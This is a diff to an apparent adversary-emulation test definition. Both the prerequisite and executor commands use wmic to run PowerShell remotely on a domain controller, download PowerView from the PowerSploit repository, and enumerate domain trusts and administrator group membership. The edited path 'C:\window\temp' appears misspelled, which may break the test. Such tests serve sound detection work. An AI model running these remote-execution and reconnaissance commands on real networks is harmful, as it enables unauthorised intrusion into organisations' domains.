@@ -36,8 +36,8 @@ atomic_tests:
     prereq_command: |
       if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}
     get_prereq_command: |
-      wmic /node:#{DC_IP} process call create "powershell  Invoke-WebRequest 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -OutFile '$env:TEMP\PowerView.ps1'"
+      wmic /node:#{DC_IP} process call create "powershell Invoke-WebRequest 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -OutFile 'C:\window\temp\PowerView.ps1'"
   executor:
     command: |
-      wmic /node:#{DC_IP} process call create "powershell Import-Module '$env:TEMP\PowerView.ps1';Get-NetDomainTrust;Get-NetForestTrust;Get-ADDomain;Get-ADGroupMember Administrators -Recursive"
+      wmic /node:#{DC_IP} process call create "powershell Import-Module 'C:\window\temp\PowerView.ps1';Get-NetDomainTrust;Get-NetForestTrust;Get-ADDomain;Get-ADGroupMember Administrators -Recursive"
     name: powershell
